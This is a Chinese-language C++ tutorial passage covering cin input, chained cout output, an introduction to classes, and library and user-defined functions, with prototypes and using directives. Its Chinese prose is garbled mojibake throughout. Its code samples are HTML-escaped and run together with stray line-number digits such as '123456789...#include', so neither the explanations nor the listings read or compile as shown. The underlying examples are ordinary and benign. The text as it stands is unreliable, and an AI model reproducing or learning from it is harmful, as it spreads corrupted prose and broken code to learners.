è¿ç®—ç¬¦é’ˆå¯¹ä¸åŒçš„æ•°æ®ç±»å‹è¿›è¡Œäº†**é‡è½½ (Overloading)**ï¼ˆæˆ‘ä»¬å°†åœ¨åç»­ç« èŠ‚è¯¦ç»†å­¦ä¹ ï¼‰ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä¸º &lt;&lt; è¿ç®—ç¬¦å®šä¹‰äº†å¤šä¸ªç‰ˆæœ¬ï¼Œæ¯ä¸ªç‰ˆæœ¬çŸ¥é“å¦‚ä½•å¤„ç†ç‰¹å®šç±»å‹çš„æ•°æ®ï¼Œå¹¶å°†å®ƒä»¬è½¬æ¢ä¸ºé€‚åˆè¾“å‡ºçš„å­—ç¬¦åºåˆ—ã€‚ 2.3 å…¶ä»–C++è¯­å¥æœ¬èŠ‚å°†ä»‹ç»æ›´å¤šC++è¯­å¥ï¼ŒåŒ…æ‹¬å¦‚ä½•ä»ç”¨æˆ·é‚£é‡Œè·å–è¾“å…¥ï¼Œå¦‚ä½•æ›´çµæ´»åœ°ä½¿ç”¨ coutï¼Œå¹¶å¯¹C++çš„æ ¸å¿ƒæ¦‚å¿µâ€”â€”ç±»è¿›è¡Œåˆæ­¥ä»‹ç»ã€‚ 2.3.1 ä½¿ç”¨cinä¸ cout ç”¨äºè¾“å‡ºç±»ä¼¼ï¼Œcin æ˜¯ iostream åº“ä¸­é¢„å®šä¹‰çš„ä¸€ä¸ªå¯¹è±¡ï¼Œä»£è¡¨æ ‡å‡†è¾“å…¥æµï¼Œé€šå¸¸è¿æ¥åˆ°é”®ç›˜ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ cin æ¥è¯»å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚ &gt;&gt; è¿ç®—ç¬¦ï¼ˆæå–è¿ç®—ç¬¦ï¼‰ç”¨äºä» cin å¯¹è±¡è·å–æ•°æ®ï¼Œå¹¶å°†å…¶å­˜å‚¨åˆ°å˜é‡ä¸­ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526#include &lt;iostream&gt; // å¿…é¡»åŒ…å« iostream ä»¥ä½¿ç”¨ cin å’Œ coutint main() &#123; int carrots; // å£°æ˜ä¸€ä¸ªæ•´å‹å˜é‡æ¥å­˜å‚¨è¾“å…¥ std::cout &lt;&lt; &quot;How many carrots do you have?&quot; &lt;&lt; std::endl; // æç¤ºç”¨æˆ·è¾“å…¥ std::cin &gt;&gt; carrots; // ä»é”®ç›˜è¯»å–ä¸€ä¸ªæ•´æ•°ï¼Œå¹¶å­˜å‚¨åˆ° carrots å˜é‡ä¸­ std::cout &lt;&lt; &quot;Here are two more. &quot;; carrots = carrots + 2; // å¯¹å˜é‡è¿›è¡Œæ“ä½œ // è¾“å‡ºç»“æœ std::cout &lt;&lt; &quot;Now you have &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots.&quot; &lt;&lt; std::endl; // è¯»å–å…¶ä»–ç±»å‹çš„æ•°æ® double price; std::cout &lt;&lt; &quot;Enter the price per carrot: &quot;; std::cin &gt;&gt; price; // è¯»å–ä¸€ä¸ªæµ®ç‚¹æ•° std::cout &lt;&lt; &quot;The total cost for &quot; &lt;&lt; carrots &lt;&lt; &quot; carrots is: &quot; &lt;&lt; carrots * price &lt;&lt; std::endl; return 0;&#125; #include &lt;iostream&gt;: ä½¿ç”¨ cin åŒæ ·éœ€è¦åŒ…å«æ­¤å¤´æ–‡ä»¶ã€‚ std::cin: cin å¯¹è±¡ä¹Ÿä½äº std åç§°ç©ºé—´ä¸­ã€‚ cin &gt;&gt; variable;: æå–è¿ç®—ç¬¦ &gt;&gt; ä»è¾“å…¥æµï¼ˆé”®ç›˜ï¼‰ä¸­è¯»å–æ•°æ®ï¼Œå¹¶æ ¹æ® variable çš„ç±»å‹è¿›è¡Œè§£é‡Šï¼Œç„¶åå°†å€¼å­˜å…¥ variableã€‚cin ä¹Ÿä¼šæ ¹æ®è¯»å–çš„æ•°æ®ç±»å‹è‡ªåŠ¨è¿›è¡Œè½¬æ¢ã€‚ è¾“å…¥åˆ†éš”: cin é€šå¸¸ä½¿ç”¨ç©ºç™½ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰æ¥åˆ†éš”ä¸åŒçš„è¾“å…¥é¡¹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç¨‹åºæœŸæœ›è¯»å–ä¸¤ä¸ªæ•´æ•° cin &gt;&gt; a &gt;&gt; b;ï¼Œç”¨æˆ·å¯ä»¥è¾“å…¥ 10 20 ç„¶åæŒ‰ Enterï¼Œæˆ–è€…è¾“å…¥ 10 æŒ‰ Enter å†è¾“å…¥ 20 æŒ‰ Enterã€‚ 2.3.2 ä½¿ç”¨coutè¿›è¡Œæ‹¼æ¥æˆ‘ä»¬åœ¨å‰é¢å·²ç»çœ‹åˆ°å¦‚ä½•ä½¿ç”¨ cout å’Œæ’å…¥è¿ç®—ç¬¦ &lt;&lt; è¾“å‡ºå•ä¸ªå€¼æˆ–å­—ç¬¦ä¸²ã€‚cout çš„ä¸€ä¸ªä¾¿æ·ä¹‹å¤„åœ¨äºï¼Œä½ å¯ä»¥åœ¨ä¸€æ¡è¯­å¥ä¸­è¿ç»­ä½¿ç”¨ &lt;&lt; è¿ç®—ç¬¦ï¼Œå°†å¤šä¸ªè¾“å‡ºé¡¹â€œæ‹¼æ¥â€åœ¨ä¸€èµ·ã€‚è¿™ç§°ä¸º**é“¾å¼è¾“å‡º (Chaining Output)**ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt; // åŒ…å« string ç±»å‹int main() &#123; int age = 28; std::string name = &quot;Bob&quot;; double weight = 75.3; // ä¸ä½¿ç”¨æ‹¼æ¥çš„å†™æ³• (å¤šæ¡è¯­å¥) std::cout &lt;&lt; &quot;Name: &quot;; std::cout &lt;&lt; name; std::cout &lt;&lt; &quot;, Age: &quot;; std::cout &lt;&lt; age; std::cout &lt;&lt; &quot;, Weight: &quot;; std::cout &lt;&lt; weight; std::cout &lt;&lt; std::endl; // ä½¿ç”¨æ‹¼æ¥çš„å†™æ³• (å•æ¡è¯­å¥ï¼Œæ›´ç®€æ´) std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; &quot;, Age: &quot; &lt;&lt; age &lt;&lt; &quot;, Weight: &quot; &lt;&lt; weight &lt;&lt; std::endl; // æ‹¼æ¥ä¸åŒç±»å‹çš„æ•°æ® std::cout &lt;&lt; &quot;In 5 years, &quot; &lt;&lt; name &lt;&lt; &quot; will be &quot; &lt;&lt; (age + 5) &lt;&lt; &quot; years old.&quot; &lt;&lt; std::endl; return 0;&#125; cout &lt;&lt; item1 &lt;&lt; item2 &lt;&lt; item3;: cout å¯¹è±¡åœ¨å¤„ç†å®Œç¬¬ä¸€ä¸ª &lt;&lt; item1 åï¼Œä¼šè¿”å›è‡ªèº« (cout)ï¼Œå› æ­¤å¯ä»¥ç»§ç»­å¤„ç†ä¸‹ä¸€ä¸ª &lt;&lt; item2ï¼Œä»¥æ­¤ç±»æ¨ã€‚ è¿™ç§é“¾å¼è°ƒç”¨ä½¿å¾—å°†å˜é‡å€¼ã€å­—ç¬¦ä¸²å­—é¢é‡å’Œè¡¨è¾¾å¼ç»“æœç»„åˆè¾“å‡ºå˜å¾—éå¸¸æ–¹ä¾¿å’Œæ˜“è¯»ã€‚ 2.3.3 ç±»ç®€ä»‹ç±» (Class) æ˜¯C++çš„æ ¸å¿ƒæ¦‚å¿µï¼Œä¹Ÿæ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰çš„åŸºç¡€ã€‚å¯ä»¥æŠŠç±»çœ‹ä½œæ˜¯åˆ›å»ºå¯¹è±¡ (Object) çš„è“å›¾æˆ–æ¨¡æ¿ã€‚ å°è£… (Encapsulation): ç±»å°†æ•°æ®ï¼ˆç§°ä¸ºæˆå‘˜å˜é‡æˆ–å±æ€§ï¼‰å’Œæ“ä½œè¿™äº›æ•°æ®çš„å‡½æ•°ï¼ˆç§°ä¸ºæˆå‘˜å‡½æ•°æˆ–æ–¹æ³•ï¼‰æ†ç»‘åœ¨ä¸€èµ·ã€‚ æŠ½è±¡ (Abstraction): ç±»æä¾›äº†ä¸€ä¸ªæ¥å£ï¼ˆé€šè¿‡å…¶å…¬æœ‰æˆå‘˜å‡½æ•°ï¼‰ï¼Œéšè—äº†å†…éƒ¨å®ç°çš„å¤æ‚ç»†èŠ‚ã€‚ æˆ‘ä»¬å·²ç»åœ¨ä½¿ç”¨ç±»çš„å¯¹è±¡äº†ï¼cout å’Œ cin å°±æ˜¯ C++ æ ‡å‡†åº“ä¸­å®šä¹‰çš„ç±»çš„å¯¹è±¡ï¼š cout æ˜¯ ostream ç±»ï¼ˆè¾“å‡ºæµç±»ï¼‰çš„ä¸€ä¸ªå¯¹è±¡ã€‚ cin æ˜¯ istream ç±»ï¼ˆè¾“å…¥æµç±»ï¼‰çš„ä¸€ä¸ªå¯¹è±¡ã€‚ ostream ç±»å®šä¹‰äº†å¦‚ä½•å¤„ç†è¾“å‡ºï¼ŒåŒ…æ‹¬ &lt;&lt; è¿ç®—ç¬¦å¦‚ä½•é’ˆå¯¹ä¸åŒæ•°æ®ç±»å‹å·¥ä½œã€‚istream ç±»å®šä¹‰äº†å¦‚ä½•å¤„ç†è¾“å…¥ï¼ŒåŒ…æ‹¬ &gt;&gt; è¿ç®—ç¬¦å¦‚ä½•è¯»å–æ•°æ®ã€‚ æ¦‚å¿µç†è§£: æƒ³è±¡ä¸€ä¸‹ â€œæ±½è½¦â€ è¿™ä¸ªç±»ï¼š æ•°æ®/å±æ€§ (æˆå‘˜å˜é‡): é¢œè‰²ã€å“ç‰Œã€å‹å·ã€å½“å‰é€Ÿåº¦ã€æ²¹é‡ç­‰ã€‚ æ“ä½œ/è¡Œä¸º (æˆå‘˜å‡½æ•°): å¯åŠ¨()ã€åŠ é€Ÿ()ã€åˆ¹è½¦()ã€é¸£ç¬›()ã€è·å–å½“å‰é€Ÿåº¦() ç­‰ã€‚ æ ¹æ®è¿™ä¸ª â€œæ±½è½¦â€ ç±»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºå…·ä½“çš„å¯¹è±¡ï¼Œæ¯”å¦‚ â€œæˆ‘çš„è“è‰²ä¸°ç”°å¡ç½—æ‹‰â€ æˆ– â€œé‚»å±…çš„çº¢è‰²æ³•æ‹‰åˆ©â€ã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰è‡ªå·±çš„å±æ€§å€¼ï¼ˆä¸åŒçš„é¢œè‰²ã€å“ç‰Œç­‰ï¼‰ï¼Œä½†å®ƒä»¬éƒ½å…±äº«ç±»å®šä¹‰çš„è¡Œä¸ºï¼ˆéƒ½å¯ä»¥å¯åŠ¨ã€åŠ é€Ÿã€åˆ¹è½¦ï¼‰ã€‚ ç¤ºä¾‹ (æ¦‚å¿µæ€§ï¼Œéå®Œæ•´ä»£ç ): 123456789101112131415161718// è¿™æ˜¯ä¸€ä¸ªéå¸¸ç®€åŒ–çš„æ¦‚å¿µå±•ç¤ºï¼Œä¸æ˜¯å®Œæ•´çš„ C++ ç±»å®šä¹‰class Car &#123;public: // å…¬æœ‰æ¥å£ï¼Œå¤–éƒ¨å¯ä»¥è®¿é—® void startEngine(); // æˆå‘˜å‡½æ•°å£°æ˜ void accelerate(int amount); void displayInfo(); private: // ç§æœ‰æ•°æ®ï¼Œå¤–éƒ¨ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œåªèƒ½é€šè¿‡æˆå‘˜å‡½æ•° std::string color; std::string brand; int currentSpeed;&#125;;// ... åœ¨ç¨‹åºçš„å…¶ä»–åœ°æ–¹ ...// Car myCar; // åˆ›å»ºä¸€ä¸ª Car ç±»çš„å¯¹è±¡ (éœ€è¦æ„é€ å‡½æ•°ç­‰ï¼Œæ­¤å¤„çœç•¥)// myCar.startEngine(); // è°ƒç”¨å¯¹è±¡çš„æˆå‘˜å‡½æ•°// myCar.accelerate(50);// myCar.displayInfo(); åœ¨åç»­ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æ·±å…¥å­¦ä¹ å¦‚ä½•å®šä¹‰å’Œä½¿ç”¨è‡ªå·±çš„ç±»ã€‚ç›®å‰ï¼Œåªéœ€ç†è§£ç±»æ˜¯å®šä¹‰æ•°æ®å’Œç›¸å…³æ“ä½œçš„ä¸€ç§æ–¹å¼ï¼Œè€Œå¯¹è±¡æ˜¯ç±»çš„å…·ä½“å®ä¾‹ï¼Œcout å’Œ cin å°±æ˜¯æˆ‘ä»¬å·²ç»æ¥è§¦åˆ°çš„å¯¹è±¡å®ä¾‹ã€‚ 2.4 å‡½æ•°å‡½æ•°æ˜¯C++ç¨‹åºçš„æ„å»ºå—ï¼Œå®ƒä»¬æ˜¯æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„å‘½åä»£ç æ®µã€‚ä½¿ç”¨å‡½æ•°å¯ä»¥ä½¿ç¨‹åºæ¨¡å—åŒ–ã€æ›´æ˜“äºç†è§£å’Œç»´æŠ¤ã€‚æœ¬èŠ‚å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨å’Œå®šä¹‰å‡½æ•°ã€‚ 2.4.1 ä½¿ç”¨æœ‰è¿”å›å€¼çš„å‡½æ•°è®¸å¤šC++å‡½æ•°ä¼šæ‰§è¡Œä¸€ä¸ªæ“ä½œå¹¶è¿”å›ä¸€ä¸ªå€¼ç»™è°ƒç”¨å®ƒçš„ä»£ç ã€‚è¿™ç§å‡½æ•°è¢«ç§°ä¸º**æœ‰è¿”å›å€¼çš„å‡½æ•° (Function with Return Value)**ã€‚ æˆ‘ä»¬å·²ç»ä½¿ç”¨è¿‡ä¸€äº›æœ‰è¿”å›å€¼çš„å‡½æ•°ï¼Œä¾‹å¦‚ C++ æ ‡å‡†åº“ &lt;cmath&gt; (æˆ– C è¯­è¨€çš„ &lt;math.h&gt;) ä¸­æä¾›çš„ sqrt() å‡½æ•°ï¼Œå®ƒè®¡ç®—ä¸€ä¸ªæ•°çš„å¹³æ–¹æ ¹å¹¶è¿”å›ç»“æœã€‚ ä½¿ç”¨æ–¹æ³•: åŒ…å«å¤´æ–‡ä»¶: ç¡®ä¿åŒ…å«äº†æä¾›è¯¥å‡½æ•°å£°æ˜çš„å¤´æ–‡ä»¶ï¼ˆä¾‹å¦‚ &lt;cmath&gt;ï¼‰ã€‚ å‡½æ•°è°ƒç”¨: ä½¿ç”¨å‡½æ•°åï¼Œå¹¶åœ¨æ‹¬å· () å†…æä¾›æ‰€éœ€çš„**å‚æ•° (Argument)**ï¼ˆä¼ é€’ç»™å‡½æ•°çš„å€¼ï¼‰ã€‚ å¤„ç†è¿”å›å€¼: å‡½æ•°è°ƒç”¨æœ¬èº«å°±æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå…¶å€¼å°±æ˜¯å‡½æ•°çš„è¿”å›å€¼ã€‚å¯ä»¥å°†è¿™ä¸ªè¿”å›å€¼èµ‹ç»™å˜é‡ã€ç”¨åœ¨æ›´å¤æ‚çš„è¡¨è¾¾å¼ä¸­æˆ–ç›´æ¥è¾“å‡ºã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;cmath&gt; // åŒ…å« cmath å¤´æ–‡ä»¶ä»¥ä½¿ç”¨ sqrt() å‡½æ•°int main() &#123; double area; std::cout &lt;&lt; &quot;Enter the floor area, in square feet, of your home: &quot;; std::cin &gt;&gt; area; // è¯»å–ç”¨æˆ·è¾“å…¥çš„é¢ç§¯ // è°ƒç”¨ sqrt() å‡½æ•°ï¼Œå¹¶å°†å‚æ•° area ä¼ é€’ç»™å®ƒ // å‡½æ•°çš„è¿”å›å€¼ (area çš„å¹³æ–¹æ ¹) è¢«èµ‹ç»™å˜é‡ side double side = std::sqrt(area); std::cout &lt;&lt; &quot;That&#x27;s the equivalent of a square &quot; &lt;&lt; side &lt;&lt; &quot; feet to the side.&quot; &lt;&lt; std::endl; // ä¹Ÿå¯ä»¥ç›´æ¥åœ¨è¾“å‡ºè¯­å¥ä¸­ä½¿ç”¨è¿”å›å€¼ std::cout &lt;&lt; &quot;The square root of 16 is: &quot; &lt;&lt; std::sqrt(16) &lt;&lt; std::endl; // è¿”å›å€¼å¯ä»¥ç”¨åœ¨è¡¨è¾¾å¼ä¸­ double hypotenuse = std::sqrt(3.0 * 3.0 + 4.0 * 4.0); // è®¡ç®—ç›´è§’ä¸‰è§’å½¢æ–œè¾¹ std::cout &lt;&lt; &quot;Hypotenuse of a 3-4 triangle: &quot; &lt;&lt; hypotenuse &lt;&lt; std::endl; return 0;&#125; std::sqrt(area): è¿™æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ã€‚std::sqrt æ˜¯å‡½æ•°åï¼Œarea æ˜¯ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°ã€‚ double side = ...: sqrt() å‡½æ•°è¿”å›ä¸€ä¸ª double ç±»å‹çš„å€¼ï¼Œè¿™ä¸ªå€¼è¢«ç”¨æ¥åˆå§‹åŒ– side å˜é‡ã€‚ 2.4.2 å‡½æ•°å˜ä½“å‡½æ•°å¯ä»¥æœ‰å¤šç§å½¢å¼ï¼š æœ‰å‚æ•°ï¼Œæœ‰è¿”å›å€¼: å¦‚ sqrt(double x)ï¼Œæ¥æ”¶ä¸€ä¸ª double å‚æ•°ï¼Œè¿”å›ä¸€ä¸ª double å€¼ã€‚ æ— å‚æ•°ï¼Œæœ‰è¿”å›å€¼: ä¾‹å¦‚ï¼ŒæŸäº›åº“å‡½æ•°å¯èƒ½è¯»å–ç³»ç»Ÿæ—¶é—´å¹¶è¿”å›ä¸€ä¸ªå€¼ï¼Œä¸éœ€è¦ç”¨æˆ·æä¾›å‚æ•°ã€‚ æœ‰å‚æ•°ï¼Œæ— è¿”å›å€¼: è¿™ç§å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ“ä½œï¼ˆå¦‚æ‰“å°åˆ°å±å¹•ï¼‰ï¼Œä½†ä¸éœ€è¦è¿”å›ä»»ä½•è®¡ç®—ç»“æœã€‚è¿™ç§å‡½æ•°çš„è¿”å›ç±»å‹é€šå¸¸å£°æ˜ä¸º voidã€‚æˆ‘ä»¬å°†åœ¨ 2.4.3 èŠ‚çœ‹åˆ°ä¾‹å­ã€‚ æ— å‚æ•°ï¼Œæ— è¿”å›å€¼: æ‰§è¡Œä¸€ä¸ªå›ºå®šçš„æ“ä½œï¼Œä¸æ¥å—è¾“å…¥å‚æ•°ä¹Ÿä¸è¿”å›ç»“æœï¼Œè¿”å›ç±»å‹ä¹Ÿæ˜¯ voidã€‚ ç¤ºä¾‹ (æ¦‚å¿µæ€§): 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;cstdlib&gt; // ä¸ºäº† rand() å’Œ srand()#include &lt;ctime&gt; // ä¸ºäº† time()// ç¤ºä¾‹ 1: æœ‰å‚æ•°ï¼Œæœ‰è¿”å›å€¼ (æˆ‘ä»¬å°†åœ¨ 2.4.4 å®šä¹‰è‡ªå·±çš„)// double calculate_something(int input); // ç¤ºä¾‹ 2: æ— å‚æ•°ï¼Œæœ‰è¿”å›å€¼int getRandomNumber() &#123; // ä½¿ç”¨ C æ ‡å‡†åº“å‡½æ•°ç”Ÿæˆä¸€ä¸ªä¼ªéšæœºæ•° return std::rand() % 100; // è¿”å› 0-99 ä¹‹é—´çš„éšæœºæ•°&#125;// ç¤ºä¾‹ 3: æœ‰å‚æ•°ï¼Œæ— è¿”å›å€¼ (æˆ‘ä»¬å°†åœ¨ 2.4.3 å®šä¹‰è‡ªå·±çš„)// void printMessage(std::string msg); // ç¤ºä¾‹ 4: æ— å‚æ•°ï¼Œæ— è¿”å›å€¼void showStartupMessage() &#123; std::cout &lt;&lt; &quot;Program starting...&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;-------------------&quot; &lt;&lt; std::endl;&#125;int main() &#123; // åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ (é€šå¸¸åªéœ€ä¸€æ¬¡) std::srand(std::time(0)); showStartupMessage(); // è°ƒç”¨æ— å‚æ•°ã€æ— è¿”å›å€¼çš„å‡½æ•° int randomNumber = getRandomNumber(); // è°ƒç”¨æ— å‚æ•°ã€æœ‰è¿”å›å€¼çš„å‡½æ•° std::cout &lt;&lt; &quot;Random number: &quot; &lt;&lt; randomNumber &lt;&lt; std::endl; // è°ƒç”¨å…¶ä»–ç±»å‹çš„å‡½æ•° (å‡è®¾å·²å®šä¹‰) // printMessage(&quot;Processing data...&quot;); // double result = calculate_something(10); // std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; 2.4.3 ç”¨æˆ·å®šä¹‰çš„å‡½æ•°é™¤äº†ä½¿ç”¨åº“å‡½æ•°ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å®šä¹‰è‡ªå·±çš„å‡½æ•°æ¥æ‰§è¡Œç‰¹å®šä»»åŠ¡ã€‚è¿™æœ‰åŠ©äºç»„ç»‡ä»£ç å’Œé‡ç”¨ä»£ç ã€‚ å®šä¹‰å‡½æ•°çš„åŸºæœ¬ç»“æ„: 123456returnType functionName(parameterList) &#123; // å‡½æ•°ä½“: åŒ…å«æ‰§è¡Œä»»åŠ¡çš„è¯­å¥ // ... // å¦‚æœ returnType ä¸æ˜¯ voidï¼Œåˆ™éœ€è¦ return è¯­å¥è¿”å›ä¸€ä¸ªå€¼&#125; returnType: å‡½æ•°æ‰§è¡Œå®Œæ¯•åè¿”å›çš„æ•°æ®ç±»å‹ã€‚å¦‚æœå‡½æ•°ä¸è¿”å›å€¼ï¼Œåˆ™ä½¿ç”¨ voidã€‚ functionName: ä½ ä¸ºå‡½æ•°é€‰æ‹©çš„åç§°ã€‚ parameterList: å‡½æ•°æ¥å—çš„å‚æ•°åˆ—è¡¨ï¼ŒåŒ…æ‹¬æ¯ä¸ªå‚æ•°çš„ç±»å‹å’Œåç§°ã€‚å¦‚æœæ²¡æœ‰å‚æ•°ï¼Œæ‹¬å· () ä»ç„¶éœ€è¦ï¼Œä½†å†…éƒ¨ä¸ºç©ºã€‚ &#123; ... &#125;: å‡½æ•°ä½“ï¼ŒåŒ…å«å‡½æ•°çš„ä»£ç ã€‚ å‡½æ•°åŸå‹ (Function Prototype): åœ¨ä½¿ç”¨å‡½æ•°ä¹‹å‰ï¼Œç¼–è¯‘å™¨éœ€è¦çŸ¥é“å‡½æ•°çš„æ¥å£ï¼ˆè¿”å›ç±»å‹ã€åç§°ã€å‚æ•°åˆ—è¡¨ï¼‰ã€‚é€šå¸¸å°†å‡½æ•°åŸå‹æ”¾åœ¨ main() å‡½æ•°ä¹‹å‰æˆ–å•ç‹¬çš„å¤´æ–‡ä»¶ä¸­ã€‚åŸå‹çœ‹èµ·æ¥åƒå‡½æ•°å¤´ï¼Œä½†ä»¥åˆ†å· ; ç»“å°¾ï¼Œå¯ä»¥çœç•¥å‚æ•°åã€‚ 1returnType functionName(parameterTypeList); // å‡½æ•°åŸå‹ ç”¨æ³•ä¸ç¤ºä¾‹ (å®šä¹‰ä¸€ä¸ªæ— è¿”å›å€¼çš„å‡½æ•°): 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// å‡½æ•°åŸå‹ (å£°æ˜)void cheers(int n); // å£°æ˜ cheers å‡½æ•°æ¥å—ä¸€ä¸ª int å‚æ•°ï¼Œæ— è¿”å›å€¼int main() &#123; std::cout &lt;&lt; &quot;Enter an integer: &quot;; int count; std::cin &gt;&gt; count; cheers(count); // å‡½æ•°è°ƒç”¨ï¼šå°† count çš„å€¼ä¼ é€’ç»™ cheers å‡½æ•° std::cout &lt;&lt; &quot;Done!&quot; &lt;&lt; std::endl; return 0;&#125;// å‡½æ•°å®šä¹‰void cheers(int n) // å®šä¹‰ cheers å‡½æ•°ï¼Œå‚æ•°åä¸º n&#123; // å‡½æ•°ä½“ for (int i = 0; i &lt; n; i++) &#123; std::cout &lt;&lt; &quot;Cheers! &quot;; &#125; std::cout &lt;&lt; std::endl; // å› ä¸ºè¿”å›ç±»å‹æ˜¯ voidï¼Œæ‰€ä»¥ä¸éœ€è¦ return è¯­å¥è¿”å›å€¼&#125; åŸå‹: void cheers(int n); å‘Šè¯‰ç¼–è¯‘å™¨ main å‡½æ•°åé¢ä¼šå®šä¹‰ä¸€ä¸ªåä¸º cheers çš„å‡½æ•°ã€‚ è°ƒç”¨: cheers(count); æ‰§è¡Œ cheers å‡½æ•°çš„ä»£ç ï¼Œå¹¶å°† count çš„å€¼å¤åˆ¶ç»™ cheers å‡½æ•°çš„å‚æ•° nï¼ˆè¿™ç§°ä¸ºæŒ‰å€¼ä¼ é€’ï¼‰ã€‚ å®šä¹‰: æä¾›äº† cheers å‡½æ•°çš„å…·ä½“å®ç°ã€‚ 2.4.4 ç”¨æˆ·å®šä¹‰çš„æœ‰è¿”å›å€¼çš„å‡½æ•°æˆ‘ä»¬å¯ä»¥å®šä¹‰è‡ªå·±çš„å‡½æ•°æ¥æ‰§è¡Œè®¡ç®—å¹¶è¿”å›ç»“æœã€‚åªéœ€å°† returnType æŒ‡å®šä¸ºæœŸæœ›çš„è¿”å›ç±»å‹ï¼Œå¹¶åœ¨å‡½æ•°ä½“ä¸­ä½¿ç”¨ return è¯­å¥è¿”å›ä¸€ä¸ªè¯¥ç±»å‹çš„å€¼ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;// å‡½æ•°åŸå‹: å£°æ˜ cube å‡½æ•°æ¥å—ä¸€ä¸ª double å‚æ•°ï¼Œè¿”å›ä¸€ä¸ª double å€¼double cube(double x); int main() &#123; double side; std::cout &lt;&lt; &quot;Enter the side length of a cube: &quot;; std::cin &gt;&gt; side; double volume = cube(side); // è°ƒç”¨ cube å‡½æ•°ï¼Œå°†è¿”å›å€¼èµ‹ç»™ volume std::cout &lt;&lt; &quot;A cube with side &quot; &lt;&lt; side &lt;&lt; &quot; has a volume of &quot; &lt;&lt; volume &lt;&lt; &quot; cubic units.&quot; &lt;&lt; std::endl; // ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨è¿”å›å€¼ std::cout &lt;&lt; &quot;The cube of 2.5 is &quot; &lt;&lt; cube(2.5) &lt;&lt; std::endl; return 0;&#125;// å‡½æ•°å®šä¹‰double cube(double x) &#123; // å‡½æ•°ä½“ double result = x * x * x; return result; // è¿”å›è®¡ç®—ç»“æœ (ç±»å‹å¿…é¡»ä¸å£°æ˜çš„è¿”å›ç±»å‹ double å…¼å®¹) // æˆ–è€…æ›´ç®€æ´åœ°ï¼š // return x * x * x; &#125; åŸå‹: double cube(double x); å£°æ˜äº†å‡½æ•°çš„æ¥å£ã€‚ è°ƒç”¨: cube(side) è°ƒç”¨å‡½æ•°ï¼Œside çš„å€¼è¢«ä¼ é€’ç»™å‚æ•° xã€‚å‡½æ•°æ‰§è¡Œåè¿”å›ä¸€ä¸ª double å€¼ã€‚ å®šä¹‰: double cube(double x) æä¾›äº†å‡½æ•°çš„å®ç°ã€‚return result; å°†è®¡ç®—å‡ºçš„ç«‹æ–¹å€¼è¿”å›ç»™è°ƒç”¨è€…ã€‚ 2.4.5 åœ¨å¤šå‡½æ•°ç¨‹åºä¸­ä½¿ç”¨usingç¼–è¯‘æŒ‡ä»¤å½“ç¨‹åºåŒ…å«å¤šä¸ªå‡½æ•°æ—¶ï¼Œæ¯ä¸ªå‡½æ•°éƒ½éœ€è¦è®¿é—® std åç§°ç©ºé—´ä¸­çš„å…ƒç´ ï¼ˆå¦‚ cout, cin, endlï¼‰ã€‚æœ‰å‡ ç§å¤„ç†æ–¹å¼ï¼š åœ¨æ¯ä¸ªå‡½æ•°ä¸­éƒ½ä½¿ç”¨ std:: å‰ç¼€: è¿™æ˜¯æœ€å®‰å…¨çš„æ–¹å¼ï¼Œå°¤å…¶æ˜¯åœ¨å¤´æ–‡ä»¶ä¸­ï¼Œä½†å¯èƒ½ä½¿ä»£ç å†—é•¿ã€‚ 12345678void func1() &#123; std::cout &lt;&lt; &quot;Hello from func1\\n&quot;;&#125;void func2() &#123; int x; std::cin &gt;&gt; x; std::cout &lt;&lt; &quot;Input in func2: &quot; &lt;&lt; x &lt;&lt; std::endl;&#125; åœ¨æ¯ä¸ªéœ€è¦è®¿é—® std çš„å‡½æ•°å†…éƒ¨ä½¿ç”¨ using å£°æ˜æˆ– using namespace std;: è¿™å°† using çš„ä½œç”¨åŸŸé™åˆ¶åœ¨å‡½æ•°å†…éƒ¨ï¼Œå‡å°‘äº†å‘½åå†²çªçš„é£é™©ã€‚ 123456789101112131415161718192021222324#include &lt;iostream&gt;void func1() &#123; using namespace std; // using æŒ‡ä»¤åªåœ¨ func1 å†…éƒ¨æœ‰æ•ˆ cout &lt;&lt; &quot;Hello from func1\\n&quot;; &#125;void func2() &#123; using std::cin; // using å£°æ˜åªå¼•å…¥ cin using std::cout; using std::endl; int x; cin &gt;&gt; x; cout &lt;&lt; &quot;Input in func2: &quot; &lt;&lt; x &lt;&lt; endl;&#125;int main() &#123; // åœ¨ main ä¸­ä¹Ÿéœ€è¦è®¿é—® std using namespace std; func1(); func2(); cout &lt;&lt; &quot;Back in main.&quot; &lt;&lt; endl; return 0;&#125; 